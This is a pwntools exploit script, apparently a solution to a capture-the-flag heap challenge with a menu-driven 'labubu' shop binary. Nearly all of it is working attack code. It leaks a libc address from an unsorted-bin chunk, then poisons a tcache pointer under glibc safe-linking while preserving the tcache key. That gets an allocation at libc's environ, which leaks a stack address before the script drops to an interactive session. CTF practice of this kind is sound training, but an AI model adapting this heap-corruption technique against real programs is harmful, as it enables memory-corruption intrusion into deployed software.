from pwn import *

context.binary = "./chal"
context.log_level = "info"

UNSORTED_OFFSET = 0x210b20
ENVIRON_OFF     = 0x217e28

io = process("./chal")

def menu(c): io.sendlineafter(b"> ", str(c).encode())
def buy(i):  menu(1); io.sendlineafter(b"> ", str(i).encode())
def sell(i): menu(4); io.sendlineafter(b"> ", str(i).encode())
def name(i, data):
    menu(2)
    io.sendlineafter(b"> ", str(i).encode())
    io.sendafter(b"Name your labubu\n", data)
def admire(i):
    menu(3)
    io.sendlineafter(b"> ", str(i).encode())
    return io.recvn(0x400)

# -------------------------
# Step 1: libc leak (unsorted)
# Allocate 0..9 (10 chunks).
# Free 0..6 to fill tcache. Free 7 -> unsorted (8 is fence).
# -------------------------
for i in range(10):
    buy(i)  # 0..9 allocated

for i in range(7):
    sell(i)
sell(7)

leak = admire(7)
fd = u64(leak[:8])
libc_base = fd - UNSORTED_OFFSET
environ_addr = libc_base + ENVIRON_OFF

log.success(f"fd leak       = {hex(fd)}")
log.success(f"libc_base      = {hex(libc_base)}")
log.success(f"environ@libc    = {hex(environ_addr)}")

# -------------------------
# Step 2: drain tcache for this size (7 entries)
# re-buy 0..6 to empty that tcache bin
# -------------------------
for i in range(7):
    buy(i)

# -------------------------
# Step 3: create a clean single-entry tcache chunk at idx 9
# -------------------------
sell(9)

leak9 = admire(9)
stored_fd  = u64(leak9[:8])      # should be chunk>>12 when next == NULL
tcache_key = u64(leak9[8:16])    # must preserve this or glibc aborts

chunk_shift = stored_fd
log.info(f"stored_fd (chunk>>12) = {hex(stored_fd)}")
log.info(f"tcache_key            = {hex(tcache_key)}")

# -------------------------
# Step 4: poison fd to point to environ (safe-linking)
# keep key unchanged: write 16 bytes (fd + key)
# -------------------------
poison_fd = environ_addr ^ chunk_shift
payload = p64(poison_fd) + p64(tcache_key) + b"\n"
name(9, payload)

# -------------------------
# Step 5: malloc twice:
# 1st returns idx9 real chunk
# 2nd returns chunk at environ address
# -------------------------
buy(9)   # pops poisoned entry -> gives back idx9 chunk
buy(8)   # next malloc -> returns pointer == environ_addr (we store it in idx8)

env_data = admire(8)
stack_ptr = u64(env_data[:8])
log.success(f"environ value (stack ptr) = {hex(stack_ptr)}")

io.interactive()
